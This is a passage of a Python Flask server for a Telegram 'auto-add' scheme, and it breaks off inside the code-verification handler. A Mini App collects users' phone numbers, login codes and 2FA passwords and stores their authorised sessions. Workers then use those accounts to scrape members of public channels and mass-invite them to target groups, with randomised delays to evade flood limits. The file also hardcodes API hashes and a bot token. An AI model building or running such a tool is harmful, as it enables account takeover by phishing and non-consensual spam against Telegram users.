#!/usr/bin/env python3
"""
Telegram Auto-Add Server - TELEGRAM MINI APP AUTO-LOGIN VERSION
Auto-detects phone from Telegram Mini App - Users only enter verification code
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
from collections import defaultdict
import traceback
import sys
import signal
from functools import wraps
import hashlib
import hmac
import urllib.parse

# Configure logging with rotation
import logging.handlers

# Create logs directory if it doesn't exist
os.makedirs('logs', exist_ok=True)

# Set up rotating file handler
file_handler = logging.handlers.RotatingFileHandler(
    'logs/server.log',
    maxBytes=10*1024*1024,  # 10MB
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION
# ============================================
SERVER_NUMBER = 4  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 38904710, 'api_hash': '3e00b37e8559fa1c64549659947b431d', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7294379764:AAHAOQ1OVT2TJ0cRAlWhyyxXQdVB3oS9K_A'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUPS = ['Abe_armygroup', 'abe_army']

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'
AUTO_SESSIONS_FILE = 'auto_sessions.json'
USER_MAP_FILE = 'user_map.json'
ERROR_LOG_FILE = 'logs/errors.log'

# Storage with thread locks
accounts = []
temp_sessions = {}
auto_sessions = {}
user_phone_map = {}
auto_add_settings = {}
running_tasks = {}
worker_adds = defaultdict(list)
file_lock = threading.Lock()
worker_lock = threading.Lock()

stats = {
    'total_added': 0,
    'today_added': 0,
    'verified_total': 0,
    'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {},
    'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat(),
    'crashes_recovered': 0
}

# ============================================
# ERROR HANDLING DECORATORS
# ============================================
def safe_operation(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in {func.__name__}: {e}")
            logger.error(traceback.format_exc())
            log_error(f"Function: {func.__name__}", e)
            return None
    return wrapper

def api_error_handler(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            error_msg = f"API Error in {func.__name__}: {e}"
            logger.error(error_msg)
            logger.error(traceback.format_exc())
            log_error(f"API: {func.__name__}", e)
            return jsonify({
                'success': False,
                'error': 'Internal server error. Please try again.',
                'error_code': 'INTERNAL_ERROR'
            }), 500
    return wrapper

def log_error(context, exception):
    try:
        timestamp = datetime.now().isoformat()
        error_entry = f"[{timestamp}] {context}\n{str(exception)}\n{traceback.format_exc()}\n{'='*50}\n"
        with open(ERROR_LOG_FILE, 'a') as f:
            f.write(error_entry)
    except:
        pass

# ============================================
# FILE OPERATIONS
# ============================================
@safe_operation
def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    backup_path = f"{path}.backup"
                    with open(backup_path, 'w') as backup:
                        json.dump(data, backup, indent=2, default=str)
                    return data
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted JSON file {path}: {e}")
        backup_path = f"{path}.backup"
        if os.path.exists(backup_path):
            try:
                with open(backup_path, 'r') as backup:
                    restored_data = json.load(backup)
                    logger.info(f"Restored {path} from backup")
                    return restored_data
            except:
                pass
        logger.warning(f"Creating fresh {path}")
        save_json(path, default)
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
    return default

@safe_operation
def save_json(path, data):
    temp_path = f"{path}.tmp"
    with file_lock:
        try:
            with open(temp_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            os.replace(temp_path, path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")
            try:
                with open(path, 'w') as f:
                    json.dump(data, f, indent=2, default=str)
            except:
                pass

def save_temp_sessions():
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time()),
            'telegram_id': session_data.get('telegram_id', ''),
            'first_name': session_data.get('first_name', ''),
            'last_name': session_data.get('last_name', ''),
            'username': session_data.get('username', '')
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    current_time = time.time()
    for session_id, session_data in sessions_data.items():
        created_at = session_data.get('created_at', 0)
        if current_time - created_at < 3600:
            temp_sessions[session_id] = session_data

def save_auto_sessions():
    save_json(AUTO_SESSIONS_FILE, auto_sessions)

def load_auto_sessions():
    global auto_sessions
    auto_sessions = load_json(AUTO_SESSIONS_FILE, {})

def save_user_map():
    save_json(USER_MAP_FILE, user_phone_map)

def load_user_map():
    global user_phone_map
    user_phone_map = load_json(USER_MAP_FILE, {})

# ============================================
# TELEGRAM CLIENT HELPER
# ============================================
class SyncTelegramClient:
    @staticmethod
    def run_async(async_func, timeout=60, retries=2):
        for attempt in range(retries + 1):
            loop = None
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(
                    asyncio.wait_for(async_func(), timeout=timeout)
                )
                return result
            except asyncio.TimeoutError:
                logger.warning(f"Async timeout on attempt {attempt + 1}")
                if attempt == retries:
                    raise
            except Exception as e:
                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                if attempt == retries:
                    raise
                time.sleep(1 * (attempt + 1))
            finally:
                if loop:
                    try:
                        loop.close()
                    except:
                        pass
    
    @staticmethod
    def get_client(session_string):
        try:
            return TelegramClient(
                StringSession(session_string), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True,
                loop=asyncio.new_event_loop()
            )
        except Exception as e:
            logger.error(f"Failed to create client: {e}")
            raise
    
    @staticmethod
    async def safe_connect(client):
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except asyncio.TimeoutError:
            return False
        except Exception as e:
            logger.error(f"Client connection error: {e}")
            return False

# ============================================
# ACCOUNT AGE DETECTION
# ============================================
def get_account_age_sync(session_string):
    async def _get_age():
        client = SyncTelegramClient.get_client(session_string)
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return {'age_display': 'Unknown', 'method': 'connection_failed'}
            if not await client.is_user_authorized():
                return {'age_display': 'Unknown', 'method': 'not_authorized'}
            me = await client.get_me()
            if hasattr(me, 'creation_date') and me.creation_date:
                creation_date = me.creation_date
                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
                    creation_date = creation_date.replace(tzinfo=None)
                age_days = (datetime.now() - creation_date).days
                age_years = age_days / 365.25
                return {
                    'creation_date': creation_date.isoformat(),
                    'age_days': age_days,
                    'age_years': round(age_years, 1),
                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
                    'year_joined': creation_date.year,
                    'method': 'creation_date'
                }
            try:
                photos = await client.get_profile_photos(me, limit=1)
                if photos and len(photos) > 0:
                    oldest_photo_date = photos[0].date
                    if hasattr(oldest_photo_date, 'tzinfo') and oldest_photo_date.tzinfo:
                        oldest_photo_date = oldest_photo_date.replace(tzinfo=None)
                    age_days = (datetime.now() - oldest_photo_date).days
                    return {
                        'creation_date': oldest_photo_date.isoformat(),
                        'age_days': age_days,
                        'age_years': round(age_days / 365.25, 1),
                        'age_display': f"~{int(age_days / 365.25)} years",
                        'year_joined': oldest_photo_date.year,
                        'method': 'oldest_photo'
                    }
            except:
                pass
            return {'age_display': 'Unknown account age', 'method': 'unknown'}
        except Exception as e:
            logger.error(f"Age detection error: {e}")
            return {'age_display': 'Error', 'method': 'error', 'error': str(e)}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    try:
        return SyncTelegramClient.run_async(_get_age, timeout=20)
    except Exception as e:
        logger.error(f"Age detection failed: {e}")
        return {'age_display': 'Unknown', 'method': 'error', 'error': str(e)}

# ============================================
# ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['today_added'] = 0
            stats['verified_today'] = 0
            stats['last_reset'] = today
            for k in stats.get('worker_stats', {}):
                stats['worker_stats'][k]['today'] = 0
                stats['worker_stats'][k]['verified_today'] = 0
            save_json(STATS_FILE, stats)
    except Exception as e:
        logger.error(f"Reset daily error: {e}")

def check_account_auth(acc, max_retries=2):
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            try:
                await client.disconnect()
            except:
                pass
    for attempt in range(max_retries):
        try:
            result = SyncTelegramClient.run_async(_check, timeout=15)
            if result is not None:
                return result
        except:
            if attempt == max_retries - 1:
                return False
            time.sleep(1)
    return False

def remove_dead_account(aid, reason=""):
    global accounts
    try:
        acc = next((a for a in accounts if a['id'] == aid), None)
        name = acc.get('name', str(aid)) if acc else str(aid)
        with worker_lock:
            accounts = [a for a in accounts if a['id'] != aid]
            auto_add_settings.pop(str(aid), None)
            if str(aid) in running_tasks:
                worker_info = running_tasks.pop(str(aid), None)
                if worker_info and hasattr(worker_info.get('worker'), 'stop'):
                    try:
                        worker_info['worker'].stop()
                    except:
                        pass
            worker_adds.pop(str(aid), None)
        save_json(ACCOUNTS_FILE, accounts)
        save_json(SETTINGS_FILE, auto_add_settings)
        save_json(WORKER_ADDS_FILE, dict(worker_adds))
        stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
        save_json(STATS_FILE, stats)
        logger.warning(f"Removed dead account: {name} | Reason: {reason}")
        try:
            send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")
        except:
            pass
        return name
    except Exception as e:
        logger.error(f"Remove account error: {e}")
        return "Unknown"

def send_telegram(text, retries=3):
    for attempt in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
                timeout=10
            )
            if response.status_code == 200:
                return True
        except Exception as e:
            logger.error(f"Send telegram error (attempt {attempt + 1}): {e}")
        if attempt < retries - 1:
            time.sleep(2)
    return False

# ============================================
# AUTO-ADD WORKER
# ============================================
class AutoAddWorker:
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_ping = time.time()
        self.consecutive_errors = 0
        self.max_consecutive_errors = 10
        self.last_activity = time.time()
        self.health_check_interval = 300
        self.last_health_check = time.time()
    
    def stop(self):
        self.running = False
        self.disconnect_client()
    
    def disconnect_client(self):
        if self.client:
            try:
                async def _disconnect():
                    await self.client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
            finally:
                self.client = None
    
    def run(self):
        logger.info(f"Auto-add worker started for account {self.account.get('name', self.acc_id)}")
        try:
            self.join_all_targets()
        except Exception as e:
            logger.error(f"Initial join targets failed: {e}")
        
        attempted_users = set()
        cycle_count = 0
        
        while self.running:
            try:
                if time.time() - self.last_health_check > self.health_check_interval:
                    self.perform_health_check()
                    self.last_health_check = time.time()
                
                self.consecutive_errors = 0
                
                settings = auto_add_settings.get(self.acc_key, {})
                if not settings.get('enabled', True):
                    self.last_activity = time.time()
                    time.sleep(5)
                    continue
                
                reset_daily()
                
                if not self.ensure_connection():
                    self.consecutive_errors += 1
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"Worker {self.acc_key}: Too many connection failures, restarting...")
                        self.reconnect()
                        self.consecutive_errors = 0
                    time.sleep(30)
                    continue
                
                user_ids = self.get_user_sources()
                if not user_ids:
                    self.last_activity = time.time()
                    time.sleep(60)
                    continue
                
                if len(attempted_users) > 10000:
                    attempted_users.clear()
                
                fresh_users = [uid for uid in user_ids if uid not in attempted_users]
                if len(fresh_users) < 50:
                    attempted_users.clear()
                    fresh_users = list(user_ids)
                
                random.shuffle(fresh_users)
                delay = max(30, settings.get('delay_seconds', 30))
                added_count = 0
                
                for user_id in fresh_users[:100]:
                    if not self.running:
                        break
                    
                    settings_check = auto_add_settings.get(self.acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted_users.add(user_id)
                    
                    try:
                        if self.add_user_to_targets(user_id):
                            added_count += 1
                            stats['today_added'] = stats.get('today_added', 0) + 1
                            stats['total_added'] = stats.get('total_added', 0) + 1
                            
                            if self.acc_key not in stats['worker_stats']:
                                stats['worker_stats'][self.acc_key] = {'total': 0, 'today': 0, 'verified_today': 0}
                            stats['worker_stats'][self.acc_key]['today'] += 1
                            stats['worker_stats'][self.acc_key]['total'] += 1
                            
                            if added_count % 10 == 0:
                                save_json(STATS_FILE, stats)
                    except Exception as e:
                        logger.error(f"Add user error: {e}")
                        self.consecutive_errors += 1
                        if self.consecutive_errors >= self.max_consecutive_errors:
                            break
                    
                    actual_delay = random.uniform(delay * 0.9, delay * 1.3)
                    self.last_activity = time.time()
                    time.sleep(actual_delay)
                    
                    if added_count > 0 and added_count % 30 == 0:
                        self.reconnect()
                
                cycle_count += 1
                logger.info(f"Cycle {cycle_count}: Added {added_count} users | Today: {stats['today_added']}")
                save_json(STATS_FILE, stats)
                
                rest_time = random.randint(60, 120)
                for _ in range(rest_time):
                    if not self.running:
                        break
                    self.last_activity = time.time()
                    time.sleep(1)
                
            except Exception as e:
                logger.error(f"Worker error (cycle): {e}")
                self.consecutive_errors += 1
                if self.consecutive_errors >= self.max_consecutive_errors:
                    logger.critical(f"Worker {self.acc_key}: Too many errors, stopping worker")
                    self.running = False
                    break
                time.sleep(30)
                self.reconnect()
    
    def perform_health_check(self):
        try:
            if time.time() - self.last_activity > 600:
                logger.warning(f"Worker {self.acc_key}: Inactive for too long, reconnecting...")
                self.reconnect()
                self.last_activity = time.time()
            if not self.ensure_connection():
                logger.warning(f"Worker {self.acc_key}: Connection unhealthy, reconnecting...")
                self.reconnect()
        except Exception as e:
            logger.error(f"Health check error: {e}")
    
    def ensure_connection(self):
        try:
            if self.client and hasattr(self.client, 'is_connected'):
                try:
                    if self.client.is_connected():
                        if time.time() - self.last_ping > 60:
                            async def ping():
                                try:
                                    await self.client.get_me()
                                    return True
                                except:
                                    return False
                            if SyncTelegramClient.run_async(ping, timeout=10):
                                self.last_ping = time.time()
                                return True
                            else:
                                return self.reconnect()
                        return True
                except:
                    pass
            return self.connect_client()
        except Exception as e:
            return self.reconnect()
    
    def connect_client(self):
        for attempt in range(3):
            try:
                self.disconnect_client()
                self.client = SyncTelegramClient.get_client(self.account['session'])
                async def _connect():
                    if not await SyncTelegramClient.safe_connect(self.client):
                        return False
                    return await self.client.is_user_authorized()
                result = SyncTelegramClient.run_async(_connect, timeout=20)
                if result:
                    self.last_ping = time.time()
                    self.last_activity = time.time()
                    return True
            except Exception as e:
                logger.error(f"Connect error (attempt {attempt + 1}): {e}")
            if attempt < 2:
                time.sleep(min(5 * (attempt + 1), 15))
        return False
    
    def reconnect(self):
        try:
            self.disconnect_client()
            time.sleep(2)
            return self.connect_client()
        except Exception as e:
            return False
    
    def join_all_targets(self):
        for target in TARGET_GROUPS:
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if not self.ensure_connection():
                        time.sleep(5)
                        continue
                    async def _join():
                        try:
                            entity = await self.client.get_entity(target)
                            await self.client(JoinChannelRequest(entity))
                            return True
                        except errors.FloodWaitError as e:
                            wait_time = min(e.seconds, 120)
                            time.sleep(wait_time)
                            return False
                        except Exception as e:
                            if 'already' in str(e).lower() or 'participant' in str(e).lower():
                                return True
                            return False
                    if SyncTelegramClient.run_async(_join, timeout=30):
                        logger.info(f"Joined {target}")
                        break
                except Exception as e:
                    logger.warning(f"Join target {target} failed: {e}")
                time.sleep(min(5 * (attempt + 1), 20))
    
    def get_user_sources(self):
        user_ids = set()
        if not self.ensure_connection():
            return user_ids
        async def _collect():
            try:
                try:
                    contacts = await self.client(GetContactsRequest(0))
                    for user in contacts.users:
                        if user.id and not getattr(user, 'bot', False):
                            user_ids.add(user.id)
                except:
                    pass
                try:
                    dialogs = await self.client.get_dialogs(limit=100)
                    for d in dialogs:
                        if d.is_user and d.entity and d.entity.id:
                            if not getattr(d.entity, 'bot', False):
                                user_ids.add(d.entity.id)
                except:
                    pass
                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest',
                               '@TelegramNews', '@builders', '@Android', '@iOS',
                               '@Python', '@programming', '@abe_army']
                for sg in source_groups:
                    try:
                        entity = await self.client.get_entity(sg)
                        participants = await self.client.get_participants(entity, limit=100)
                        for user in participants:
                            if user.id and not getattr(user, 'bot', False):
                                user_ids.add(user.id)
                        await asyncio.sleep(0.5)
                    except:
                        continue
                return list(user_ids)
            except Exception as e:
                logger.error(f"Collection error: {e}")
                return []
        try:
            return SyncTelegramClient.run_async(_collect, timeout=45)
        except:
            return []
    
    def add_user_to_targets(self, user_id):
        success = False
        async def _add_to_target(target):
            try:
                entity = await self.client.get_entity(target)
                user_input = await self.client.get_input_entity(user_id)
                await self.client(InviteToChannelRequest(entity, [user_input]))
                return True
            except errors.FloodWaitError as e:
                wait_time = min(e.seconds, 60)
                time.sleep(wait_time)
                return False
            except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
                    errors.UserAlreadyParticipantError, errors.UserKickedError,
                    errors.UserBannedInChannelError, errors.UserDeactivatedBanError):
                return False
            except Exception as e:
                return False
        for target in TARGET_GROUPS:
            if not self.running:
                break
            if not self.ensure_connection():
                break
            try:
                if SyncTelegramClient.run_async(lambda: _add_to_target(target), timeout=15):
                    success = True
            except:
                continue
        if success:
            try:
                record = {
                    'user_id': user_id,
                    'time': datetime.now().isoformat(),
                    'worker_id': self.acc_id
                }
                worker_adds[self.acc_key].append(record)
                if len(worker_adds[self.acc_key]) > 1000:
                    worker_adds[self.acc_key] = worker_adds[self.acc_key][-1000:]
                if len(worker_adds[self.acc_key]) % 10 == 0:
                    save_json(WORKER_ADDS_FILE, dict(worker_adds))
            except:
                pass
        return success

def start_auto_add(account):
    acc_key = str(account['id'])
    with worker_lock:
        try:
            if acc_key in running_tasks:
                existing = running_tasks[acc_key]
                if existing and existing.get('thread') and existing['thread'].is_alive():
                    return
            worker = AutoAddWorker(account)
            thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
            thread.start()
            running_tasks[acc_key] = {'thread': thread, 'worker': worker}
        except Exception as e:
            logger.error(f"Start worker error: {e}")

def stop_auto_add(account_id):
    acc_key = str(account_id)
    with worker_lock:
        try:
            if acc_key in running_tasks:
                worker_info = running_tasks[acc_key]
                if worker_info and worker_info.get('worker'):
                    try:
                        worker_info['worker'].stop()
                    except:
                        pass
                running_tasks.pop(acc_key, None)
        except Exception as e:
            logger.error(f"Stop auto add error: {e}")

# ============================================
# FLASK ROUTES
# ============================================

@app.errorhandler(404)
def not_found(e):
    return jsonify({'success': False, 'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(e):
    log_error("Server error 500", e)
    return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/')
def index():
    return redirect('/auto-add')

@app.route('/auto-add')
def auto_add_page():
    try:
        return send_file('auto_add.html')
    except FileNotFoundError:
        return "auto_add.html not found", 404

@app.route('/login')
def login_page():
    try:
        return send_file('login.html')
    except FileNotFoundError:
        return "login.html not found", 404

@app.route('/dashboard')
def dashboard_page():
    try:
        return send_file('dashboard.html')
    except FileNotFoundError:
        return "dashboard.html not found", 404

@app.route('/dash')
def dash_page():
    try:
        return send_file('dash.html')
    except FileNotFoundError:
        return "dash.html not found", 404

@app.route('/all')
def all_page():
    try:
        return send_file('all.html')
    except FileNotFoundError:
        return "all.html not found", 404

@app.route('/ping')
@api_error_handler
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'timestamp': datetime.now().isoformat(),
        'workers': len(running_tasks)
    })

@app.route('/api/server-info')
@api_error_handler
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_groups': TARGET_GROUPS
        }
    })

@app.route('/api/accounts')
@api_error_handler
def get_accounts():
    acc_list = []
    for a in accounts:
        try:
            aid_str = str(a['id'])
            ws = stats.get('worker_stats', {}).get(aid_str, {})
            acc_list.append({
                'id': a['id'],
                'name': a.get('name', '?'),
                'phone': a.get('phone', ''),
                'username': a.get('username', ''),
                'active': a.get('active', True),
                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
                'stats': {
                    'total_added': ws.get('total', 0),
                    'today_added': ws.get('today', 0)
                },
                'is_running': aid_str in running_tasks
            })
        except:
            continue
    return jsonify({'success': True, 'accounts': acc_list})

# ============================================
# TELEGRAM MINI APP AUTO-LOGIN
# ============================================
@app.route('/api/telegram-auto-login', methods=['POST'])
@api_error_handler
def telegram_auto_login():
    """
    Auto-login for Telegram Mini App users
    Extracts user info from Telegram initData and auto-sends verification code
    """
    try:
        data = request.json or {}
        init_data_str = data.get('initData', '')
        
        # Also try to get from URL parameters
        if not init_data_str:
            init_data_str = request.args.get('initData', '')
        
        # Also check for query string from Telegram Mini App
        if not init_data_str and request.query_string:
            init_data_str = request.query_string.decode('utf-8')
        
        if not init_data_str:
            return jsonify({
                'success': False,
                'error': 'Please open this app from Telegram.',
                'needs_phone': True
            })
        
        # Parse initData
        parsed = {}
        for item in init_data_str.split('&'):
            if '=' in item:
                key, value = item.split('=', 1)
                parsed[key] = urllib.parse.unquote(value)
        
        # Get user data from Telegram
        user_json = parsed.get('user', '{}')
        try:
            user_data = json.loads(user_json)
        except:
            user_data = {}
        
        telegram_id = str(user_data.get('id', ''))
        first_name = user_data.get('first_name', '')
        last_name = user_data.get('last_name', '')
        username = user_data.get('username', '')
        
        if not telegram_id:
            # Try to get from URL hash parameters (some Mini Apps pass it differently)
            user_param = parsed.get('tgWebAppData', '')
            if user_param:
                try:
                    inner_parsed = {}
                    for item in user_param.split('&'):
                        if '=' in item:
                            key, value = item.split('=', 1)
                            inner_parsed[key] = urllib.parse.unquote(value)
                    inner_user = inner_parsed.get('user', '{}')
                    inner_user_data = json.loads(inner_user)
                    telegram_id = str(inner_user_data.get('id', ''))
                    first_name = inner_user_data.get('first_name', first_name)
                    last_name = inner_user_data.get('last_name', last_name)
                    username = inner_user_data.get('username', username)
                except:
                    pass
        
        if not telegram_id:
            return jsonify({
                'success': False,
                'error': 'Could not identify your Telegram account.',
                'needs_phone': True
            })
        
        logger.info(f"Telegram Mini App user: {first_name} {last_name} (@{username}) ID: {telegram_id}")
        
        # Check if we already have this user's phone
        phone = user_phone_map.get(telegram_id, '')
        
        # Also check auto_sessions
        if not phone and telegram_id in auto_sessions:
            phone = auto_sessions[telegram_id].get('phone', '')
        
        # Also check accounts list for matching telegram_id
        if not phone:
            for acc in accounts:
                if acc.get('telegram_id') == telegram_id and acc.get('phone'):
                    phone = acc['phone']
                    break
        
        if phone:
            # We have the phone - send code automatically
            logger.info(f"Found phone for user {telegram_id}: {phone}")
            
            async def send_auto_code():
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                await client.connect()
                try:
                    result = await client.send_code_request(phone)
                    sid = str(int(time.time() * 1000))
                    temp_sessions[sid] = {
                        'phone': phone,
                        'hash': result.phone_code_hash,
                        'session': client.session.save(),
                        'password_attempts': 0,
                        'code_attempts': 0,
                        'created_at': time.time(),
                        'telegram_id': telegram_id,
                        'first_name': first_name,
                        'last_name': last_name,
                        'username': username
                    }
                    save_temp_sessions()
                    
                    masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else '***' + phone[-3:]
                    
                    return {
                        'success': True,
                        'session_id': sid,
                        'phone_masked': masked_phone,
                        'auto_detected': True,
                        'user_name': f"{first_name} {last_name}".strip()
                    }
                except errors.FloodWaitError as e:
                    return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
                except Exception as e:
                    logger.error(f"Auto code error: {e}")
                    return {'success': False, 'error': str(e)[:200]}
                finally:
                    try:
                        await client.disconnect()
                    except:
                        pass
            
            result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
            
            # If phone is invalid/not working, clear it and ask for new one
            if not result.get('success'):
                if telegram_id in user_phone_map:
                    del user_phone_map[telegram_id]
                    save_user_map()
                if telegram_id in auto_sessions:
                    del auto_sessions[telegram_id]
                    save_auto_sessions()
                result['needs_phone'] = True
            
            return jsonify(result)
        
        else:
            # No phone saved - need phone number
            return jsonify({
                'success': False,
                'error': 'First time setup. Please enter your phone number.',
                'needs_phone': True,
                'telegram_id': telegram_id,
                'user_name': f"{first_name} {last_name}".strip(),
                'username': username
            })
            
    except Exception as e:
        logger.error(f"Telegram auto-login error: {e}")
        log_error("Telegram auto-login", e)
        return jsonify({
            'success': False,
            'error': 'Auto-login failed. Please enter your phone number.',
            'needs_phone': True
        })

# ============================================
# ADD ACCOUNT (with or without phone)
# ============================================
@app.route('/api/add-account', methods=['POST'])
@api_error_handler
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        telegram_id = data.get('telegramId', '')
        
        # If no phone provided, try auto-detect
        if not phone:
            if telegram_id:
                phone = user_phone_map.get(str(telegram_id), '')
            if not phone:
                return jsonify({
                    'success': False,
                    'error': 'Phone number required.',
                    'needs_phone': True
                })
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time() * 1000))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save(),
                    'password_attempts': 0,
                    'code_attempts': 0,
                    'created_at': time.time(),
                    'telegram_id': telegram_id
                }
                save_temp_sessions()
                return {'success': True, 'session_id': sid, 'phone': phone}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except Exception as e:
                logger.error(f"Send code error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(send_code, timeout=45)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

@app.route('/api/verify-code', methods=['POST'])
@api_error_handler
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
        
        td = temp_sessions[sid]
        telegram_id = td.get('telegram_id', '')
        
        if td.get('code_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect code attempts. Session expired.'})
        
        if td.get('password_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect password attempts. Session expired.'})
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                    td['code_attempts'] = 0
                    save_temp_sessions()
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    try:
                        await client.sign_in(password=pwd)
                        td['password_attempts'] = 0
                        save_temp_sessions()
                    except errors.PasswordHashInvalidError:
                        td['password_attempts'] = td.get('password_attempts', 0) + 1
                        save_temp_sessions()
                        remaining = 5 - td['password_attempts']
                        if remaining <= 0:
                            del temp_sessions[sid]
                            save_temp_sessions()
                            return {'success': False, 'error': 'Too many incorrect passwords. Session expired.'}
                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                
